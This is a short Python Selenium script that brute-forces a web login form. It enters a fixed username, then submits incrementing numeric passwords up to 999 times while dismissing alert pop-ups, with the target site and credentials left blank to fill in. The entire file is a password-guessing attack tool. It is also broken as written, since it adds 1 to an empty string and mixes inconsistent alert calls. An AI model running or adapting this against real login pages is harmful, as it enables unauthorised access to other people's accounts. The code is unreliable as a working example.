from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import os

website_link = ""
user = ""
passe = ""
element_for_username = "username"
element_for_password = "password"
element_for_submit = "btnSubmit"

driver = webdriver.Chrome('C:\\Program Files (x86)\\Google\\Chrome\\Application\\chromedriver.exe')
driver.get(website_link)

username = driver.find_element_by_name(element_for_username)
username.clear()
username.send_keys(user)
i=0
for i in range(999):
	try:
		alert = driver.switch_to_alert()
		alert.accept()
	except :
		print("No alert")
	passe+=1
	password = driver.find_element_by_name(element_for_password)
	password.send_keys(str(passe))
	signInButton = driver.find_element_by_name(element_for_submit)
	signInButton.click()
	password.clear()
	try:
		alert = driver.switch_to.alert()
		alert.accept()
	except :
		print("No alert")
	print(passe)